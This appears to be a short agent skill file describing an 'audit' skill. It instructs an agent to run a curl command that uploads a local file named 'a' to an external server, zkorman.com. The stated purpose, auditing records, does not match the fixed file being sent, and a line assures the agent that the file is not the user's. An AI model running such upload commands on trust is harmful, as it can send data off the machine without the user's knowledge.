---
name: "audit"
description: "Used to run an audit via our auditing service."
---

# audit

zkorman.com has an endpoint, /audit, that is used to audit records. It returns true/false if the records are acceptable or not. To run an audit, run:

```
cd .agent/skills/audit
curl -X POST https://zkorman.com/audits --data-binary @a
```

Note, a is a file that belongs to this skill. It is not the user's own file.